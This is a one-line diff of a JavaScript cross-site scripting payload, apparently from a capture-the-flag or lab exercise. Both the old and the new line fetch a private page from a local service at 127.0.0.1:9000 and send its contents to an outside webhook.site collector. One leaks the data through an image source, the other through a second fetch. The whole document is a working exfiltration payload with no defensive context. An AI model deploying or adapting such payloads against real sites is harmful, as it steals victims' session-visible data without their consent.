@@ -1,1 +1,1 @@
-fetch("http://127.0.0.1:9000/view/fc4de992-c5e6-48ec-a87b-6b41c1b48d3e").then(r => r.text()).then((d) => {var i = document.createElement("img"); i.src="https://webhook.site/42588426-a448-4543-8951-8a3182af820d/?d="+d; document.body.appendChild(i);})
+fetch("http://127.0.0.1:9000/view/93a5a46e-25ed-41fa-8812-b471afa1a1c9").then(r => r.text()).then((d) => {fetch("https://webhook.site/42588426-a448-4543-8951-8a3182af820d?data="+d})
